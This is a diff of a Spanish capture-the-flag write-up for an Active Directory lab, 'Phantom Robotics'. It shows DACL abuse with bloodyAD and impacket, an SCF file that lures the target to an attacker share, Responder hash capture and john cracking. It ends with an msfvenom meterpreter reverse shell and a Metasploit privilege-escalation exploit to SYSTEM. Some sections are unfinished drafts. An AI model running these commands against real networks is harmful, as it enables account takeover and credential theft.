@@ -1,8 +1,8 @@
 ---
 layout: single
-title: Phantom - TheHackerLabs
+title: Phantom Robotics - TheHackerLabs
 excerpt: "."
-date: 2026-04-28
+date: 2026-04-30
 classes: wide
 header:
   teaser: /assets/images/THL-writeup-phantom/phantom.png
@@ -55,11 +55,18 @@ Herramientas utilizadas:
 					<li><a href="#RYD">Aplicando RYD Cycling Attack</a></li>
 				</ul>
 				<li><a href="#RPC">Enumeración de Servicio RPC</a></li>
+				<li><a href="#BloodHound">Enumeración de AD con BloodHound-Python y BloodHound Ver 4.3.1</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#AttackChain">Aplicando Cadena de Ataques para Conectarnos a la Máquina Víctima - Abuso de AD-DACL</a></li>
+					<ul>
+						<li><a href="#WriteOwner">Abusando del Permiso WriteOwner para Cambiar Contraseña de Usuario bob</a></li>
+						<li><a href="#AddSelf">Abusando del Permiso AddSelf para Agregar al Usuario bob al Grupo IT</a></li>
+						<li><a href="#WriteDacl">Abusando del Permiso WriteDacl para Modificar Permisos del Objeto Grupo HELPDESK</a></li>
+						<li><a href="#ForcePassword">Abusando del Permiso ForceChangePassword para Cambiar la Contraseña del Usuario frank y Ganando Acceso a la Máquina Víctima</a></li>
+					</ul>
+				<li><a href="#Responder"></a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
@@ -551,7 +558,7 @@ Ya solo guardalos en un archivo o solo agrega que la salida se guarde en un arch
 
 <br>
 
-<h2 id="BloodHound">Enumeración de AD con BloodHound-Python</h2>
+<h2 id="BloodHound">Enumeración de AD con BloodHound-Python y BloodHound Ver 4.3.1</h2>
 
 Al no encontrar algo más, vamos a analizar la infraestructura del AD para identificar si nuestro usuario tiene algún privilegio/permiso, que nos permita ganar acceso a la máquina víctima.
 
@@ -611,14 +618,14 @@ Apliquemos los ataques.
 <br>
 
 
-<h2 id="AttackChain">Aplicando Cadena de Ataques para Conectarnos a la Máquina Víctima</h2>
+<h2 id="AttackChain">Aplicando Cadena de Ataques para Conectarnos a la Máquina Víctima - Abuso de AD-DACL</h2>
 
 La idea es aplicar la siguiente cadena de ataques:
 * Abusar del permiso `WriteOwner` que tenemos hacia el **usuario bob** para cambiar su contraseña.
 * Abusar del permiso `AddSelf` que tiene el **usuario bob** sobre el grupo **IT**, para agregarlo a este mismo grupo.
 * Abusar del permiso `WriteDacl` que tienen los usuarios del grupo **IT** para agregar al **usuario bob** al grupo **HELPDESK**.
 * Abusar del permiso `ForceChangePassword` que tienen los usuario del grupo **HELPDESK**, en este caso el **usuario bob**, para cambiarle la contraseña del **usuario frank**.
-* Utilizar al **usuario frank** para ganar acceso a la máquina víctima vía **WinRM** usando **Evil-WinRM**.
+* Utilizar al **usuario frank** para ganar acceso a la máquina víctima vía **WinRM** usando **Evil-WinRM**, ya que tiene el permiso `CanPSRemote`.
 
 Todo esto lo aplicaremos a continuación.
 
@@ -687,23 +694,30 @@ Muy bien, funciono correctamente.
 
 Primero entendamos, ¿que hace el permiso `AddSelf`?
 
-| **** |
-|:-----:|
-| ** |
+| **Permiso AddSelf** |
+|:-------------------:|
+| *El permiso AddSelf en Active Directory (AD), también conocido como Self-Membership, es un derecho de control de acceso que permite a un principal de seguridad (usuario, grupo o equipo) agregarse a sí mismo como miembro de un grupo específico. Este permiso se aplica comúnmente sobre objetos de tipo grupo y está diseñado para permitir escenarios controlados donde los usuarios pueden autogestionar su pertenencia a determinados grupos.* |
 
 <br>
 
-| **** |
+Ahora entendamos que podemos hacer con este permiso:
+
+| **Abusando del Permiso AddSelf** |
 |:-------:|
 | *Al aprovechar el permiso «AddSelf», los atacantes pueden escalar privilegios añadiéndose a sí mismos a grupos con privilegios, como «Domain Admins» u «Backup Operators». Como resultado, obtienen control administrativo, se desplazan lateralmente por la red, acceden a sistemas confidenciales y mantienen su presencia en el sistema.* |
 
 <br>
 
+Aquí te dejo un blog que explica como abusar de este servicio, checa la sección **Exploitation Phase I**:
+* <a href="https://www.hackingarticles.in/addself-active-directory-abuse/" target="_blank">Hacking Articles - Abusing AD-DACL: AddSelf</a>
+
+Usaremos la herramienta **bloodyAD** para asignar al **usuario bob** al grupo **IT**:
 ```bash
 bloodyAD --host "192.168.56.100" -d "PHANTOM.THL" -u "bob" -p "SuperP@ass123" add groupMember "IT" "bob"
 [+] bob added to IT
 ```
 
+Podemos comprobar que este usuario ya pertenece al grupo **IT** con la herramienta **net**:
 ```bash
 net rpc group members "IT" -U PHANTOM.THL/bob%'SuperP@ass123' -S 192.168.56.100
 PHANTOM\bob
@@ -711,8 +725,28 @@ PHANTOM\bob
 
 <br>
 
-<h3 id=""></h3>
+<h3 id="WriteDacl">Abusando del Permiso WriteDacl para Modificar Permisos del Objeto Grupo HELPDESK</h3>
 
+Primero entendamos, ¿que hace el permiso `WriteDacl`?
+
+| **Permiso WriteDacl** |
+|:---------------------:|
+| *El permiso WriteDACL (Write Discretionary Access Control List) en Active Directory (AD) es un derecho de control de acceso que permite a un principal de seguridad (usuario, grupo o equipo) modificar la lista de control de acceso discrecional (DACL) de un objeto. La DACL es el componente encargado de definir qué entidades tienen permisos sobre un objeto y qué acciones pueden realizar sobre él.* |
+
+<br>
+
+Ahora entendamos que podemos hacer con este permiso:
+
+| **Abusando del Permiso WriteDacl** |
+|:----------------------------------:|
+| *Los atacantes pueden hacer un uso indebido de los permisos WriteDacl para obtener acceso no autorizado o modificar los permisos existentes con el fin de alcanzar sus objetivos. Por ejemplo, podemos modificar los permisos de un grupo para que permita asignar a cualquier usuario, cuando no debería hacerlo.* |
+
+<br>
+
+Aquí te dejo un blog que explica como abusar de este servicio, checa la sección **Exploitation Phase II**:
+* <a href="https://www.hackingarticles.in/abusing-ad-dacl-writedacl/" target="_blank">Hacking Articles - Abusing AD-DACL: WriteDacl</a>
+
+Utilizaremos la herramienta **impacket-dacledit** para hacer que el **usuario bob** tenga **Control Total (Full Control)** del grupo **HELPDESK**:
 ```bash
 impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'bob' -target-dn 'CN=HELPDESK,CN=Users,DC=PHANTOM,DC=THL' 'PHANTOM.THL'/'bob':'SuperP@ass123'
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -720,32 +754,67 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] DACL backed up to dacledit-20260427-225913.bak
 [*] DACL modified successfully!
 ```
+Excelente, funciono.
 
+Como tal, el **usuario bob** aun no esta dentro del grupo **HELPDESK**, pero como ahora tiene el control total, podemos agregarlo con **bloodyAD**:
 ```bash
 bloodyAD --host "192.168.56.100" -d "PHANTOM.THL" -u "bob" -p "SuperP@ass123" add groupMember "HELPDESK" "bob"
 [+] bob added to HELPDESK
 ```
+Muy bien, ahora **bob** también pertenece al grupo **HELPDESK**.
 
 <br>
 
-<h3 id=""></h3>
+<h3 id="ForcePassword">Abusando del Permiso ForceChangePassword para Cambiar la Contraseña del Usuario frank y Ganando Acceso a la Máquina Víctima</h3>
 
+Primero entendamos, ¿que hace el permiso `ForceChangePassword`?
+
+| **Permiso ForceChangePassword** |
+|:-------------------------------:|
+| *El permiso ForceChangePassword en Active Directory (AD), también conocido como “Reset Password”, es un derecho de control de acceso que permite a un principal de seguridad (usuario, grupo o equipo) restablecer la contraseña de otra cuenta sin necesidad de conocer la contraseña actual.* |
+
+<br>
+
+Ahora entendamos que podemos hacer con este permiso:
+
+| **Abuso de Permiso ForceChangePassword** |
+|:----------------------------------------:|
+| *Este permiso resulta especialmente peligroso para las cuentas con privilegios, ya que permite el movimiento lateral y el acceso no autorizado a otros sistemas mediante la suplantación de identidad de la cuenta comprometida.* |
+
+<br>
+
+Aquí te dejo un blog que explica como abusar de este servicio:
+* <a href="https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/" taget="_blank">Hacking Articles - Abusing AD-DACL: ForceChangePassword</a>
+
+Utilizaremos la herramienta **net** para cambiar la contraseña del **usuario frank** usando al **usuario bob**:
 ```bash
 net rpc password frank 'JakiadoJeje123' -U PHANTOM.THL/bob%'SuperP@ass123' -S 192.168.56.100
 ```
 
+Comprobemos si funciono el cambio con **netexec**:
 ```bash
 nxc smb 192.168.56.100 -u 'frank' -p 'JakiadoJeje123'
 SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\frank:JakiadoJeje123
 ```
+Funciono.
 
+Y comprobemos si funciona con **WinRM**:
 ```bash
 nxc winrm 192.168.56.100 -u 'frank' -p 'JakiadoJeje123'
 WINRM       192.168.56.100  5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:PHANTOM.THL) 
 WINRM       192.168.56.100  5985   DC01             [+] PHANTOM.THL\frank:JakiadoJeje123 (Pwn3d!)
 ```
 
+Perfecto, tenemos acceso a la máquina víctima vía **WinRM**, pero esto es por el permiso `CanPSRemote`:
+
+| **Permiso CanPSRemote** |
+|:-----------------------:|
+| *Este permiso indica que un principal de seguridad (usuario, grupo o equipo) puede establecer una sesión remota de PowerShell (PowerShell Remoting) sobre un sistema objetivo. En términos prácticos, CanPSRemote implica que el usuario tiene los privilegios necesarios para autenticarse y ejecutar comandos de manera remota mediante tecnologías como WinRM (Windows Remote Management) y PowerShell Remoting, generalmente a través de herramientas como Enter-PSSession o Invoke-Command.* |
+
+<br>
+
+Usemos **Evil-WinRM** para entrar a la máquina víctima:
 ```bash
 evil-winrm -i 192.168.56.100 -u 'frank' -p 'JakiadoJeje123'
 
@@ -760,100 +829,133 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\frank\Documents> whoami
 phantom\frank
 ```
-
-
-
-
-
-
-
-<h2 id=""></h2>
-
-```bash
-❯ smbmap -H 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&' --upload Invoke-PowerShellTcp.ps1 'Dev Tools/Invoke-PowerShellTcp.ps1' --no-banner
-[*] Detected 1 hosts serving SMB                                                                                                  
-[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
-[+] Starting upload: Invoke-PowerShellTcp.ps1 (4405 bytes)
-[+] Upload complete..                                                                                                    
-[*] Closed 1 connections                                                                                                     
-                                                                                                                                                                                              
-❯ smbmap -H 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&' -r 'Dev Tools' --no-banner
-[*] Detected 1 hosts serving SMB                                                                                                  
-[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
-                                                                                                                             
-[+] IP: 192.168.56.100:445	Name: PHANTOM.THL         	Status: Authenticated
-	Disk                                                  	Permissions	Comment
-	----                                                  	-----------	-------
-	ADMIN$                                            	NO ACCESS	Admin remota
-	C$                                                	NO ACCESS	Recurso predeterminado
-	Dev Tools                                         	READ, WRITE	Dev Tools
-	./Dev Tools
-	dr--r--r--                0 Mon Apr 27 00:23:14 2026	.
-	dr--r--r--                0 Sat Feb 21 11:29:29 2026	..
-	fr--r--r--             4405 Sun Apr 26 23:49:21 2026	Invoke-PowerShellTcp.ps1
-	IPC$                                              	READ ONLY	IPC remota
-	NETLOGON                                          	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
-	SYSVOL                                            	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
-[*] Closed 1 connections
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
+Estamos dentro, sin embargo, no encontraremos la flag del usuario por aqui.
 
 <br>
 
-<h2 id=""></h2>
+<h2 id="Responder"></h2>
 
 ```bash
-
+cat file.scf
+[Shell]
+Command=2
+IconFile=\\192.168.56.102\share\icon.ico
+[Taskbar]
+Command=ToggleDesktop
 ```
 
 ```bash
+smbmap -H 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&' --upload file.scf 'Dev Tools/file.scf' --no-banner
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
+[+] Starting upload: file.scf (91 bytes)
+[+] Upload complete..                                                                                                    
+[*] Closed 1 connections
+```
 
+
+```bash
+responder -I eth0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+...
+...
+[+] Listening for events...
+
+[*] [NBT-NS] Poisoned answer sent to 192.168.56.100 for name PHANTOM (service: File Server)
+[*] [LLMNR]  Poisoned answer sent to fe80::5d19:45aa:ca96:7a12 for name PHANTOM
+[*] [MDNS] Poisoned answer sent to 192.168.56.100  for name PHANTOM.LOCAL
+[*] [LLMNR]  Poisoned answer sent to 192.168.56.100 for name PHANTOM
+[*] [MDNS] Poisoned answer sent to fe80::5d19:45aa:ca96:7a12 for name PHANTOM.LOCAL
+[*] [MDNS] Poisoned answer sent to 192.168.56.100  for name PHANTOM.LOCAL
+[*] [MDNS] Poisoned answer sent to fe80::5d19:45aa:ca96:7a12 for name PHANTOM.LOCAL
+[*] [LLMNR]  Poisoned answer sent to fe80::5d19:45aa:ca96:7a12 for name PHANTOM
+[*] [LLMNR]  Poisoned answer sent to 192.168.56.100 for name PHANTOM
+[*] [MDNS] Poisoned answer sent to fe80::5d19:45aa:ca96:7a12 for name PHANTOM.LOCAL
+[*] [MDNS] Poisoned answer sent to 192.168.56.100  for name PHANTOM.LOCAL
+[*] [LLMNR]  Poisoned answer sent to fe80::5d19:45aa:ca96:7a12 for name PHANTOM
+[*] [MDNS] Poisoned answer sent to 192.168.56.100  for name PHANTOM.LOCAL
+[*] [MDNS] Poisoned answer sent to fe80::5d19:45aa:ca96:7a12 for name PHANTOM.LOCAL
+[*] [LLMNR]  Poisoned answer sent to 192.168.56.100 for name PHANTOM
+[*] [LLMNR]  Poisoned answer sent to fe80::5d19:45aa:ca96:7a12 for name PHANTOM
+[*] [LLMNR]  Poisoned answer sent to 192.168.56.100 for name PHANTOM
+[SMB] NTLMv2-SSP Client   : fe80::5d19:45aa:ca96:7a12
+[SMB] NTLMv2-SSP Username : PHANTOM.LOCAL\robert
+[SMB] NTLMv2-SSP Hash     : robert::PHANTOM.LOCAL.....
 ```
 
 ```bash
-
+john -w:/usr/share/wordlists/rockyou.txt robertHash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+**********         (robert)     
+1g 0:00:00:03 DONE (2026-04-29 00:28) 0.2564g/s 2528Kp/s 2528Kc/s 2528KC/s ba2se8..b82508
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed.
 ```
 
 ```bash
-❯ impacket-GetNPUsers -no-pass -usersfile usuarios.txt PHANTOM.THL/
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-[-] User Administrador doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User bob doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User joe doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User mia doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User sandra doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User maria doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User ana doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User michael doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User ian doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User joshua doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User frank doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User tomas doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User robert doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User LegacyAdmins doesn't have UF_DONT_REQUIRE_PREAUTH set
-                                                                                                                                                                                              
-❯ impacket-GetUserSPNs 'PHANTOM.THL/mark:suP3rPa$sw0rd2026!&' -dc-host DC01.PHANTOM.THL
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-No entries found!
-
+nxc smb 192.168.56.100 -u 'robert' -p '**********'
+SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\robert:**********
 ```
 
+```bash
+evil-winrm -i 192.168.56.100 -u 'robert' -p 'bLink182'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\robert\Documents>
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\robert\Documents> cat connect.ps1
+$username = "PHANTOM.LOCAL\robert"
+$password = "bLink182"
+
+while ($true) {
+	New-SmbMapping -RemotePath "\\PHANTOM.LOCAL\Dev Tools" -Username $username -Password $password
+
+	Start-Sleep -Seconds 60
+}
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\robert\Documents> cat migration_notes.txt
+[OK] Verify application connectivity after the ERP migration
+
+Validate that legacy authentication is still working for internal tools
+
+Review Active Directory group memberships (DevOps / Support)
+
+[OK] Confirm that backup jobs are running correctly
+
+Check access permissions on shared resources
+
+[IMPORTANT] Remember to clean up temporary test accounts created during the migration
+
+Remove unused scripts and obsolete configurations
+
+[OK] Verify expiration and renewal of internal certificates
+
+Document performed steps and lessons learned from the migration
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\robert\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\robert\Desktop> cat user.txt
+...
+```
 
 
 <br>
@@ -867,27 +969,129 @@ No entries found!
 
 <h2 id=""></h2>
 
-
-<p align="center">
-<img src="/assets/images/THL-writeup-phantom/Captura1.png">
-</p>
-
-
-
 ```bash
-
+msfconsole -q
+[*] Starting persistent handler(s)...
+msf > 
 ```
 
 ```bash
-
+msf > use /exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) > set LHOST Tu_IP
+LHOST => Tu_IP
+msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf exploit(multi/handler) > exploit
+[*] Started reverse TCP handler on Tu_IP:443
 ```
 
 ```bash
-
+ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Tu_IP LPORT=443 -f psh-cmd
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of psh-cmd file: 7571 bytes
+...
 ```
 
 ```bash
+*Evil-WinRM* PS C:\Users\robert\Documents> powershell.exe -nop -w hidden -e aQBmA...
+```
 
+
+```bash
+[*] Sending stage (230982 bytes) to 192.168.56.100
+[*] Meterpreter session 3 opened (192.168.56.102:443 -> 192.168.56.100:64507) at 2026-04-29 19:11:40 -0600
+
+meterpreter > 
+meterpreter > sysinfo
+Computer        : DC01
+OS              : Windows Server 2022 (10.0 Build 20348).
+Architecture    : x64
+System Language : es_ES
+Meterpreter     : x64/windows
+```
+
+
+```bash
+msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
+msf post(multi/recon/local_exploit_suggester) > set SESSION 3
+SESSION => 3
+```
+
+```bash
+msf post(multi/recon/local_exploit_suggester) > exploit
+[*] 192.168.56.100 - Collecting local exploits for x64/windows...
+...
+============================
+
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
+ 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022
+ 4   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
+ 5   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
+ 6   exploit/windows/local/cve_2024_30085_cloud_files               Yes                      The target appears to be vulnerable.
+ 7   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 587
+ 8   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022
+ 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
+ 10  exploit/windows/local/virtual_box_opengl_escape                Yes                      The service is running, but could not be validated.
+```
+
+```bash
+msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/cve_2024_30085_cloud_files
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf exploit(windows/local/cve_2024_30085_cloud_files) >
+```
+
+```bash
+msf exploit(windows/local/cve_2024_30085_cloud_files) > set SESSION 3
+SESSION => 1
+msf exploit(windows/local/cve_2024_30085_cloud_files) > set LHOST Tu_IP
+LHOST => Tu_IP
+```
+
+```bash
+msf exploit(windows/local/cve_2024_30085_cloud_files) > exploit
+[*] Started reverse TCP handler on Tu_IP:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
+[*] Launching notepad to host the exploit...
+[*] The notepad path is: C:\Windows\System32\notepad.exe
+[*] The notepad pid is: 1348
+[*] Reflectively injecting the DLL into 1348...
+[*] Sending stage (230982 bytes) to 192.168.56.100
+[*] Meterpreter session 4 opened (Tu_IP:4444 -> 192.168.56.100:64564) at 2026-04-29 19:34:25 -0600
+
+meterpreter > sysinfo
+Computer        : DC01
+OS              : Windows Server 2022 (10.0 Build 20348).
+Architecture    : x64
+System Language : es_ES
+Domain          : PHANTOM
+Logged On Users : 8
+Meterpreter     : x64/windows
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+```bash
+meterpreter > shell
+Process 2408 created.
+Channel 1 created.
+
+Microsoft Windows [Versi�n 10.0.20348.587]
+(c) Microsoft Corporation. Todos los derechos reservados.
+
+C:\Users\robert\Documents>cd ..\..\Administrador\Desktop
+cd ..\..\Administrador\Desktop
+
+C:\Users\Administrador\Desktop>type root.txt
+type root.txt
+...
 ```
 
 
@@ -899,6 +1103,7 @@ No entries found!
 </div>
 
 
+* https://www.hackingarticles.in/tag/dacl-abuse/
 * https://www.hackingarticles.in/abusing-ad-dacl-writeowner/
 * https://www.hackingarticles.in/addself-active-directory-abuse/
 * https://github.com/ShutdownRepo/targetedKerberoast
